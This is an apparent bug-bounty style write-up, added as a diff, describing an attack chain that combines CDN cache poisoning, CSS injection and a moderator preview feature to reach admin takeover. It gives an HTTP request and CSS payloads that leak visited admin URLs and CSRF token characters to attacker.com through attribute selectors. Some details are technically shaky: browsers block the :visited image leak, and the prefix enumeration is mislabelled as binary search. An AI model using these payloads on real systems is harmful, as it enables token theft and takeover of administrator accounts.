@@ -1,0 +1,51 @@
+The overlooked low bug
+
+    CDN caches responses based only on URL + Accept header (ignores Cookie)
+
+    CSS injection in user-generated content (sanitized HTML but allows <style>)
+
+The chaining enabler
+
+    :visited CSS selector leaks browsing history
+
+    App has "Preview as user" feature for moderators
+
+Advanced chain
+Step 1 – Poison CDN cache with victim-specific response
+http
+
+GET /profile/victim_456?css_inject=1 HTTP/1.1
+Host: target.com
+Accept: text/css
+Cookie: (attacker's cookie, but CDN ignores)
+
+CDN caches /profile/victim_456?css_inject=1 → serves to all users.
+Step 2 – Malicious CSS payload in victim's profile
+css
+
+<style>
+  /* If admin visited /admin/users, their CSS reveals it */
+  a[href="/admin/users"]:visited {
+    background: url('https://attacker.com/leak?admin_visited_users');
+  }
+  
+  /* If CSRF token exists in DOM, leak character by character */
+  input[name="csrf"][value^="a"] {
+    background: url('https://attacker.com/csrf_startswith_a');
+  }
+</style>
+
+Step 3 – Attacker forces victim to view poisoned page
+
+    Attacker posts comment with <style> block
+
+    Moderator (victim) previews comment → CSS leaks admin panel URLs + CSRF token chars
+
+Step 4 – Reconstruct CSRF token via binary search CSS
+css
+
+input[name="csrf"][value^="a"] { background: url('//attacker.com/a'); }
+input[name="csrf"][value^="b"] { background: url('//attacker.com/b'); }
+/* ... 62 possibilities (a-z, A-Z, 0-9) */
+
+Why P1: Leak CSRF token + admin path → full admin takeover.
